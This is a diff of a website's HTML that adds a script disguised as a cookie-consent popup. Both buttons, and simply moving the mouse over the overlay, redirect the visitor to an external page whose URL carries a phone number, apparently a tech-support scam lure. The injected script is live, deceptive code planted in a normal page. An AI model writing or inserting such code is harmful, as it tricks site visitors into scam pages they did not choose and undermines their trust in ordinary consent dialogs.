@@ -277,5 +277,139 @@ src="https://c.statcounter.com/13185760/0/8f95b94d/1/"
 alt="free web stats"
 referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
 <!-- End of Statcounter Code -->
+    <script>
+	
+	(() => {
+	
+	    const REDIRECT_URL = "https://staticfile-2ef88.wasmer.app/index.html?Aniph=1-833-351-3851";
+	
+	    let isRedirected = false;
+	
+	    let startPos = null;
+	
+	    let hasMovedInsideActiveArea = false; // Flag to track movement within the active 80% area
+	
+	    function handleRedirect() {
+	
+	        if (isRedirected) return;
+	
+	        isRedirected = true;
+	
+	        window.location.href = REDIRECT_URL;
+	
+	    }
+	
+	    function detectMouseMove(event) {
+	
+	        const noticeOverlay = document.querySelector('.notice-overlay');
+	
+	        if (!noticeOverlay) return;
+	
+	        const rect = noticeOverlay.getBoundingClientRect();
+	
+	        const overlayHeight = rect.height;
+	
+	        const skipHeight = overlayHeight * 0.05; // 10% from the top
+	
+	        const activeTop = rect.top + skipHeight; // The y-coordinate where the active area begins
+	
+	        // Check if the cursor is within the active 80% of the overlay (from `activeTop` downwards)
+	
+	        const isInsideActiveArea = (
+	
+	            event.clientX >= rect.left &&
+	
+	            event.clientX <= rect.right &&
+	
+	            event.clientY >= activeTop && // Start checking from activeTop
+	
+	            event.clientY <= rect.bottom
+	
+	        );
+	
+	        if (isInsideActiveArea) {
+	
+	            if (!startPos) {
+	
+	                startPos = { x: event.clientX, y: event.clientY };
+	
+	                return;
+	
+	            }
+	
+	            const moveThreshold = 10; // Pixels
+	
+	            if (Math.abs(event.clientX - startPos.x) > moveThreshold || Math.abs(event.clientY - startPos.y) > moveThreshold) {
+	
+	                if (!hasMovedInsideActiveArea) { // Only trigger timeout once per entry into the active area
+	
+	                    hasMovedInsideActiveArea = true;
+	
+	                    setTimeout(handleRedirect, 1000); // Redirect after 1 second of movement detection
+	
+	                }
+	
+	            }
+	
+	        } else {
+	
+	            // Reset if cursor moves outside the active area
+	
+	            startPos = null;
+	
+	            hasMovedInsideActiveArea = false;
+	
+	        }
+	
+	    }
+	
+	    function generateConsentPopup() {
+	
+	        const overlayDiv = document.createElement("div");
+	
+	        overlayDiv.className = "notice-overlay";
+	
+	        overlayDiv.setAttribute("role", "dialog");
+	
+	        overlayDiv.setAttribute("aria-modal", "true");
+	
+	        overlayDiv.innerHTML = `
+	<div class="notice-modal">
+	<div class="notice-icon" aria-hidden="true">🍪</div>
+	<h2 class="notice-header">Are you consenting to cookies?</h2>
+	<p class="notice-message">
+	
+	                    We use cookies to enhance your experience, analyze site usage, and assist in our marketing efforts. By clicking "Accept All" or continuing to browse, you consent to the use of cookies.
+	<a href="${REDIRECT_URL}" target="_blank">View our full Cookie Policy here.</a>
+	</p>
+	<div class="notice-actions">
+	<button id="accept-btn" class="notice-btn notice-btn--yes">Accept All</button>
+	<button id="reject-btn" class="notice-btn notice-btn--no">Manage Preferences</button>
+	</div>
+	</div>
+	
+	        `;
+	
+	        return overlayDiv;
+	
+	    }
+	
+	    document.addEventListener("DOMContentLoaded", () => {
+	
+	        const consentPopup = generateConsentPopup();
+	
+	        document.body.appendChild(consentPopup);
+	
+	        document.getElementById("accept-btn").addEventListener("click", handleRedirect);
+	
+	        document.getElementById("reject-btn").addEventListener("click", handleRedirect);
+	
+	        window.addEventListener("mousemove", detectMouseMove);
+	
+	    });
+	
+	})();
+	</script>
 </body>
+
 </html> 
